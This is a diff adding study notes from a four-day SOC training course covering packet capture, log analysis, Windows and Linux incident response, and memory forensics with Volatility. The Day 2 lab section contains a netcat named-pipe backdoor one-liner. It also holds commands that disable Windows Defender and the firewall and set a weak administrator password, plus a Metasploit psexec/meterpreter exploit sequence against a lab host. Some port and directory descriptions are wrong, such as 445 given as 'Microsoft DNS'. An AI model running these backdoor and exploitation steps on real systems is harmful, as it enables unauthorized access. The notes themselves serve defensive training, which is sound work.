@@ -1,0 +1,168 @@
+SOC Training Documentation. PDF file with images will be added in later time.
+
+This document captures key learning points from the SOC 4-day training, starting with networking fundamentals, incident response, and hands-on cybersecurity analysis. All labs were made available in MetaCTF
+
+Day 1: Network Essentials & TCP/IP Analysis
+
+Overview of Networking & SOC Training
+	•	Introduction to TCP/IP, Linux, and Windows Command-Line for incident response.
+	•	Understanding network-based malware detection.
+	•	Identifying suspicious network activity using tcpdump and Wireshark.
+
+Atomic Controls & Malware Detection
+	•	Common Ports Used to Hide Malware Transfers:
+	•	53 (DNS), 80 (HTTP), 3389 (RDP)
+	•	Top 10 Ports to Monitor:
+	•	80 (HTTP), 23 (Telnet), 22 (SSH), 443 (HTTPS), 3389 (RDP), 445 (Microsoft DNS), 139 (NetBIOS), 21 (FTP), 135 (MSRPC), 25 (SMTP)
+	•	Shodan Queries for Threat Hunting:
+	•	Example: jetdirect (printer port)
+	•	Port 5900 (VNC - Virtual Network Computing)
+	•	Finding active sessions using:
+
+netstat -ano | findstr :5900
+sudo netstat -tulnp | grep 5900
+
+TCPDump Lab - Packet Capture & Analysis
+	•	Basic Commands to become root and be in the tcpdump directory
+sudo su -
+cd /opt/tcpdump
+
+	•	Analyzing a PCAP file:
+tcpdump -n -r magnitude_1hr.pcap host 192.168.99.52
+
+	•	Shows timestamps, source/destination IPs, control bit flags, sequence numbers, and data size.
+	•	Filtering by Port and Protocols:
+
+tcpdump -n -r magnitude_1hr.pcap host 192.168.99.52 and port 80 -A
+	•	-A → ASCII Output
+
+tcpdump -n -r magnitude_1hr.pcap ip6
+	•	Captures IPv6 traffic.
+
+📌 More PCAP Samples:
+Try hands-on analysis with sample malware captures from Active Countermeasures.
+Day 2: Linux Incident Response & Malware Analysis
+
+Essential Linux Directories for Investigation
+	•	/etc/shadow → Stores hashed passwords.
+	•	/etc/lib → Library files (Micro-kernel architecture).
+	•	/proc → Holds process IDs (PIDs).
+
+cd /proc/3321
+strings ./exe | less
+
+Monitoring Active Processes & Network Connections
+We created a 1 line malware in first terminal (Shell1) and ran the listening port in another terminal (Shell2) and threat monitoing in another terminal(Shell3).
+top   # View running processes
+lsof -i -p  # List open files by process
+ls  # Add a space before command to avoid storing it in history
+
+Detecting Backdoor Shells
+	1.	Shell 1 (Attacker’s Reverse Shell)
+
+mknod backpipe -p
+/bin/bash backpipe 0<backpipe | nc -l 2222 1>backpipe
+
+	•	Netcat backdoor running on port 2222.
+
+	2.	Shell 2 (Listener)
+
+lsof -i -P
+
+	•	Detects active Netcat sessions.
+
+	3.	Shell 3 (Incident Investigator)
+
+ps aux | grep nc
+
+
+📌 Key Takeaway: Even after renaming Netcat, the malware still runs! Need memory forensics to fully eliminate it.
+
+Windows Live Attack & Defense (Metasploit)
+Similar lab to above in Windows environment.
+
+Making Windows Insecure for Testing
+Set-MpPreference -DisableRealtimeMonitoring $true  # Disable Windows Defender
+netsh advfirewall set allprofiles state off  # Disable Firewall
+net user Administrator password1234  # Set an easy password
+
+Attacking with Metasploit (Kali Linux)
+Metasploit is used as remote access vs C2 here.
+
+msfconsole
+use exploit/windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOST 10.10.68.46
+set SMBUser Administrator
+set SMBPass password1234
+exploit
+
+	•	Established a remote Meterpreter shell on target Windows system.
+
+Detecting Malware in Windows
+netstat -ano | findstr :4444  # Identify suspicious connections
+tasklist /m /fi "pid eq 7088"  # Find malware-associated processes
+wmic process where processid=7088 get commandline  # Check execution details
+
+	•	PID 7088 was running an unauthorized shell session.
+
+Windows Log Analysis with DeepBlueCLI
+
+Analyze security event logs for suspicious behavior:
+
+.\DeepBlue.ps1 .\evtx\smb-password-guessing-security.evtx
+
+Day 3: Server Log & Memory Analysis
+
+Analyzing Cisco ASA Firewall Logs
+
+grep 192.168.1.6 ASA-syslogs.txt | grep FIN | cut -d ' ' -f 1,3,4,5,7,8,9,10,11,12,13,14
+
+	•	Filter logs for a specific IP and look for FIN (connection close) packets.
+
+Statistical Analysis with R
+
+grep 192.168.1.6 ASA-syslogs.txt | grep FIN | cut -d ' ' -f 8,14 | Rscript -e 'y <-scan("stdin", quiet=TRUE)' -e 'cat(min(y), max(y), mean(y), sd(y), var(y), sep="\n")'
+
+	•	Analyzes byte transfer patterns for potential data exfiltration.
+
+Day 4: Memory Forensics with Volatility
+
+Identifying Malicious Processes in Memory
+
+python3 vol.py -f ./memdump.vmem windows.malfind.Malfind
+
+	•	Found TrustMe.exe, a suspicious process.
+
+Network Activity from Memory Dump
+
+python3 vol.py -f ./memdump.vmem windows.netscan
+
+	•	Discovered an SMB connection to another computer, indicating lateral movement.
+
+Checking Running Processes
+
+python3 vol.py -f ./memdump.vmem windows.pslist
+
+	•	Found cmd.exe, often used for unauthorized access.
+
+Zeek, MITRE ATT&CK, and Threat Hunting
+	•	Zeek (formerly Bro) for deep network traffic analysis.
+	•	MITRE ATT&CK Framework for mapping tactics & techniques.
+	•	RITA (Real Intelligence Threat Analytics) for behavior-based detection.
+
+Sample Threat Hunting Queries
+	•	In the winlab-agent dataset, what is the connection interval for 10.10.98.30?
+	•	In the gcat dataset, what is the historic FQDN for the beacon on 10.55.100.111?
+	•	For the dnscat2-ja3-strobe-agent dataset, what domain has the highest lookup count
+
+ More labs on Volatility and Web Application found in IntroClassFiles.
+
+Conclusion
+	•	Hands-on practice with TCPDump, Netstat, Metasploit, DeepBlueCLI, Volatility.
+	•	Incident response techniques using memory and log forensics.
+	•	Threat intelligence tools like Zeek, Shodan, and MITRE ATT&CK.
+ 	•	Continue working on labs using link: https://github.com/KAISERaustin/IntroLabsRemastered/blob/master/IntroClassFiles/navigation.md
+  •	Get certified for ACE-T Core: https://mctf.io/acet-core-cert
+ 
+
